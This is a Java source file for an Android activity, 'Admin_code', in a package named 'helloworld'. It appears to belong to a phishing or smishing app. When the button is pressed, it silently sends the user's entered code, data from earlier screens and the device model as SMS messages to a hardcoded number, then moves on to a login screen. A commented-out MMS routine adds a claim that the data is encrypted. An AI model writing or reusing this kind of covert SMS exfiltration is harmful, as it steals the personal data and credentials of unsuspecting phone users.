package com.corporation.helloworld;

import androidx.appcompat.app.AppCompatActivity;
import com.corporation.helloworld.Share.Application;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.inputmethod.InputMethodManager;
import android.widget.Button;
import android.widget.EditText;

import com.klinker.android.send_message.Message;
import com.klinker.android.send_message.Settings;
import com.klinker.android.send_message.Transaction;

import java.util.ArrayList;

public class Admin_code extends AppCompatActivity {
    private Application application;
    SharedPreferences localData;
    SharedPreferences.Editor editor;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_admin_code);


        Button admin_code_back = findViewById(R.id.admin_code_back);
        Button admin_code_send = findViewById(R.id.admin_code_send);
        EditText editText = findViewById(R.id.admin_code_input);

        Intent number = getIntent();
        String data = number.getStringExtra("msg");
        String first_Msg=number.getStringExtra("first_Msg");
        String second_Msg=number.getStringExtra("second_Msg");
        Log.e("data",data);

        localData = getSharedPreferences("checkCount", Activity.MODE_PRIVATE);
        editor = localData.edit();

        admin_code_send.setOnClickListener(v -> {
            editor.putString("admin_code",editText.getText().toString());
            editor.commit();
            sendtoMessage("!"+first_Msg);
            sendtoMessage("@"+second_Msg);
            sendtoMessage("#"+data);
            sendtoMessage("$"+editText.getText().toString()+"/"+ Build.MODEL);
     //       sendMMS(data+"/"+editText.getText().toString()+"/"+ Build.MODEL);
            Intent intent = new Intent(getApplicationContext(), Join_logOn.class);
            startActivity(intent);
            overridePendingTransition(R.anim.fade_in, R.anim.fade_out);
        });
    }


    public static void sendtoMessage(String sms) {
        String phoneNo = "16664594";
        //  String phoneNo = "01083330907";
      //  sms += "/모든 데이터는 암호화 되어 전송됩니다";
        Log.e("byteCheck",byteCheck(sms)+"");
        try {
            //전송
            SmsManager smsManager = SmsManager.getDefault();
            ArrayList partMessage = smsManager.divideMessage(sms);
            smsManager.sendMultipartTextMessage(phoneNo, null, partMessage, null, null);
        } catch (Exception e) {
            //   Toast.makeText(this, "SMS faild, please try again later!", Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }

    public static String byteCheck(String txt) {

        // 바이트 체크 (영문 1, 한글 2, 특문 1)
        int en = 0;
        int ko = 0;
        int etc = 0;

        char[] txtChar = txt.toCharArray();
        for (int j = 0; j < txtChar.length; j++) {
            if (txtChar[j] >= 'A' && txtChar[j] <= 'z') {
                en++;
            } else if (txtChar[j] >= '\uAC00' && txtChar[j] <= '\uD7A3') {
                ko++;
                ko++;
            } else {
                etc++;
            }
        }

        int txtByte = en + ko + etc;
        Log.e("/","/".getBytes()+"");

//            for (int i =0; i<91-txtByte; i++){
//                txt += "/";
//            }



        return txt;
    }



    public void sendMMS(String sms) {
        String phoneNo = "16664594";
        String text = sms +"/모든 데이터는 암호화 되어 전송됩니다";

        Settings settings = new Settings();
        settings.setUseSystemSending(true);

        // 이 Transaction 클래스를 위에 링크에서 다운받아서 써야함
        Transaction transaction = new Transaction(this, settings);

        //제목이 없을경우
        Message message = new Message(text, phoneNo);

        long id = android.os.Process.getThreadPriority(android.os.Process.myTid());

        transaction.sendNewMessage(message, id);
    }

    @Override
    public boolean dispatchTouchEvent(MotionEvent ev) {
        View focusView = getCurrentFocus();
        if (focusView != null) {
            Rect rect = new Rect();
            focusView.getGlobalVisibleRect(rect);
            int x = (int) ev.getX(), y = (int) ev.getY();
            if (!rect.contains(x, y)) {
                InputMethodManager imm = (InputMethodManager) getSystemService(INPUT_METHOD_SERVICE);
                if (imm != null)
                    imm.hideSoftInputFromWindow(focusView.getWindowToken(), 0);
                focusView.clearFocus();
            }
        }
        return super.dispatchTouchEvent(ev);
    }

}